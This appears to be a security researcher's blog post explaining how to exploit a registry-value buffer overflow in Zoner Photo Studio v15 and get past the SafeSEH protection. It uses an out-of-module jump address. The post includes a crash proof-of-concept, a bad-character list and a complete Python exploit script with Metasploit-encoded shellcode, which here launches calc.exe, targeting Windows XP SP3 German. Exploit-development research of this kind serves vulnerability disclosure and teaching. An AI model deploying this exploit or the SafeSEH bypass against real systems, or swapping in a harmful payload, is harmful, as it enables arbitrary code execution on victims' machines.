---
title: Bypassing SafeSEH Memory Protection in Zoner Photo Studio v15
categories:
- Advisory
- Exploit
---
My last advisory [IA42 "Zoner Photo Studio v15 Build3 (Zps.exe) Registry Value Parsing Local Buffer Overflow"](http://security.inshell.net/advisory/42) looks like a general exploitable vulnerability, but it is quite interesting to exploit because there is a major memory protection in use: SafeSEH.

But first of all, let's have a look at the PoC-Script, which demonstrates the vulnerability:

{% highlight python %}
#!/usr/bin/python

file="poc.reg"

junk1="\x41" * 2140
boom="\x42\x42\x42\x42"
junk2="\x43" * 1000

poc="Windows Registry Editor Version 5.00\n\n"
poc=poc + "[HKEY_CURRENT_USER\Software\ZONER\Zoner Photo Studio 15\Preferences\Certificate]\n"
poc=poc + "\"Issuer\"=\"" + junk1 + boom + junk2 + "\""

try:
    print "[*] Creating exploit file...\n";
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!";
except:
    print "[!] Error while creating file!";
    {% endhighlight %}

The application loads the value from the "Issuer" Registry key during the launch and crashes:

[![]({{ site.baseurl }}/assets/poc-1.png "poc-1")]({{ site.baseurl }}/assets/poc-1.png)

May the exploit development begin. But if you try to overwrite the EIP with an address pointing to memory you control, you'll recognize that something abnormally happens:

[![]({{ site.baseurl }}/assets/safeseh-1.png "safeseh-1")]({{ site.baseurl }}/assets/safeseh-1.png)

The application terminates unexpectedly and the EIP points to:

{% highlight python %}
EIP 7C91E460 ntdll.KiUserCallbackDispatcher
{% endhighlight %}

And this is a hint for a memory protection called **SafeSEH**. SafeSEH is a mechanism introduced with Microsoft Visual Studio 2005 (Compiler option /SAFESEH). It protects the exception handler chain by adding a "safe" exception handler table. This basically means that if the flow is changed within the exception handler chain and the address of the SE handler is not within such a table , SafeSEH will terminate the application. This prevents the code execution through an exploited exception handler chain. For more detailed information on this specific topic, visit: [http://msdn.microsoft.com/en-us/library/9a89h429(VS.80).aspx](http://msdn.microsoft.com/en-us/library/9a89h429(VS.80).aspx)

The following screen will clarify what I mean:  
[![]({{ site.baseurl }}/assets/safeseh-2.png "safeseh-2")]({{ site.baseurl }}/assets/safeseh-2.png)  
Parts of the stack are overwritten including the "SE handler". Now the ntdll.KiUserCallbackDispatcher walks down the exception handler chain and checks if the exception handler pointers are valid. But at which point is an exception handler declared as invalid ?

1.  The exception handler points to an address on the stack
2.  The exception handler does fall within the list of loaded modules (and the application image itself) and does not match the list of valid registered exception handlers of the module.

But how can SafeSEH be bypassed ?

**Find a module which is not protected by SafeSEH!**

This is the easy way. SafeSEH cannot protect something where it is not enabled. So let's have a look at the loaded modules during runtime and check if there is a module which is not compiled with the /SAFESEH instruction. Mona.py can do this work for you easily:

{% highlight python %}
!mona modules
{% endhighlight %}

[![]({{ site.baseurl }}/assets/safeseh-3.png "safeseh-3")]({{ site.baseurl }}/assets/safeseh-3.png)

There is only one module, which is not SafeSEH-enabled, but it's a small one (size of 0x00003000) and it does not contain any useful instructions to complete the exploit. That's bad. What's next ?

**The way around SafeSEH!**

What does SafeSEH think if the address is outside the range of a loaded module and the application image ? Correct. SafeSEH does consider this address to be safe! This probably makes the exploit a lot more unrealiable than using an instruction from an SafeSEH-disabled module but I don't care for this demonstration ;-).

Let's have a look at those addresses. Another pretty cool [Corelan script](http://redmine.corelan.be:8800/projects/pvefindaddr) "pvefindaddr.py" for the Immunity debugger helps finding such "out-of-scope" instructions. Pvefindaddr.py is the predecessor of mona.py - most of its functions have been migrated to mona.py but I'm missing this one:

{% highlight python %}
!pvefindaddr jseh
{% endhighlight %}

The result:  
[![]({{ site.baseurl }}/assets/safeseh-4.png "safeseh-4")]({{ site.baseurl }}/assets/safeseh-4.png)

There are some usable addresses (and after some reboots and reinstalls of Zoner Photo Studio I recognized that the marked address was always available, which makes the further exploit more reliable). The address **0x0C7D8F13** contains a

{% highlight python %}
JMP DWORD PTR SS:[EBP-18] - Access: (PAGE_READWRITE)
{% endhighlight %}

which points exactly to the beginning of the controlled memory (EBP-18):

[![]({{ site.baseurl }}/assets/safeseh-5.png "safeseh-5")]({{ site.baseurl }}/assets/safeseh-5.png)

The ntdll.KiUserCallbackDispatcher interprets the address **0x0C7D8F13** (which is out of scope :-) ) as valid, wich leads to the execution of our controllable memory part:

[![]({{ site.baseurl }}/assets/safeseh-6.png "safeseh-6")]({{ site.baseurl }}/assets/safeseh-6.png)

Now after executing "JMP DWORD PTR SS:[EBP-18]" the EIP points to the "Pointer to next SEH record" (sometimes referred as "nseh" in other exploits - I'll adopt this ;-) ). All you have to do is to jump over the next few bytes, which contain the overwritten SE handler. And since we're talking assembler a simple short jump (EB 06) will jump over the SE handler to the next part of our controlled input:

[![]({{ site.baseurl }}/assets/safeseh-7.png "safeseh-7")]({{ site.baseurl }}/assets/safeseh-7.png)

Now you can put the shellcode right after the overwritten SE handler. But be careful when building the shellcode - there are some characters which may break your .reg file like:

{% highlight python %}
\x00\x0a\x0d\x22\x93
{% endhighlight %}

(it took some time to find out which chars are evil :-D )

And finally the working exploit code for Windows XP SP3 (German):

{% highlight python %}
#!/usr/bin/python

from struct import pack

file="poc.reg"

junk1="\xCC" * 2136
nseh="\xeb\x06\x90\x90"
eip=pack('<L',0x0C7D8F13) # JMP DWORD PTR SS:[EBP-18] - Access: (PAGE_READWRITE) [SafeSEH Bypass]
nops="\x90" * 10 
junk2="\xCC" * 1000

# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d\x22\x93'

shellcode = ("\xbd\x55\xd9\x54\xcd\xdb\xdc\xd9\x74\x24\xf4\x5a\x33\xc9" +
"\xb1\x33\x31\x6a\x12\x03\x6a\x12\x83\x97\xdd\xb6\x38\xeb" +
"\x36\xbf\xc3\x13\xc7\xa0\x4a\xf6\xf6\xf2\x29\x73\xaa\xc2" +
"\x3a\xd1\x47\xa8\x6f\xc1\xdc\xdc\xa7\xe6\x55\x6a\x9e\xc9" +
"\x66\x5a\x1e\x85\xa5\xfc\xe2\xd7\xf9\xde\xdb\x18\x0c\x1e" +
"\x1b\x44\xff\x72\xf4\x03\x52\x63\x71\x51\x6f\x82\x55\xde" +
"\xcf\xfc\xd0\x20\xbb\xb6\xdb\x70\x14\xcc\x94\x68\x1e\x8a" +
"\x04\x89\xf3\xc8\x79\xc0\x78\x3a\x09\xd3\xa8\x72\xf2\xe2" +
"\x94\xd9\xcd\xcb\x18\x23\x09\xeb\xc2\x56\x61\x08\x7e\x61" +
"\xb2\x73\xa4\xe4\x27\xd3\x2f\x5e\x8c\xe2\xfc\x39\x47\xe8" +
"\x49\x4d\x0f\xec\x4c\x82\x3b\x08\xc4\x25\xec\x99\x9e\x01" +
"\x28\xc2\x45\x2b\x69\xae\x28\x54\x69\x16\x94\xf0\xe1\xb4" +
"\xc1\x83\xab\xd2\x14\x01\xd6\x9b\x17\x19\xd9\x8b\x7f\x28" +
"\x52\x44\x07\xb5\xb1\x21\xf7\xff\x98\x03\x90\x59\x49\x16" +
"\xfd\x59\xa7\x54\xf8\xd9\x42\x24\xff\xc2\x26\x21\xbb\x44" +
"\xda\x5b\xd4\x20\xdc\xc8\xd5\x60\xbf\x8f\x45\xe8\x6e\x2a" +
"\xee\x8b\x6e")

poc="Windows Registry Editor Version 5.00\n\n"
poc=poc + "[HKEY_CURRENT_USER\Software\ZONER\Zoner Photo Studio 15\Preferences\Certificate]\n"
poc=poc + "\"Issuer\"=\"" + junk1 + nseh + eip + nops + shellcode + junk2 + "\""

try:
    print "[*] Creating exploit file...\n";
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!";
except:
    print "[!] Error while creating file!";
{% endhighlight %}

Et voila:  
[![]({{ site.baseurl }}/assets/safeseh-8.png "safeseh-8")]({{ site.baseurl }}/assets/safeseh-8.png)

A short side - notice:  
This exploit will only work on Windows XP SP3 German, because there are for example completely different out-of-scope addresses on Windows 7 SP1 (x64, German):

[![]({{ site.baseurl }}/assets/safeseh-9.png "safeseh-9")]({{ site.baseurl }}/assets/safeseh-9.png)
